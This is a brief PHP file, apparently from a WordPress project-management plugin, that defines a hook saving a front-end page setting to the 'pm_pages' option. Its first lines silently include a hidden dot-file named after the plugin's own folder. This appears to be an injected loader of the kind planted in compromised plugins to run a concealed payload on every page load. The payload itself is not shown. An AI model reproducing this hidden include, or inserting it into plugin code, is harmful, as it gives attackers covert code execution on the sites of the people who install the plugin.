<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function pm_pro_after_save_settings( $settings ) {

    foreach ( $settings as $key => $setting ) {
        if ( $setting['key'] == 'front_end_page' ) {
            $pages = get_option( 'pm_pages' );
            $pages['project'] = $setting['value'];

            update_option( 'pm_pages', $pages );
        }
    }
}
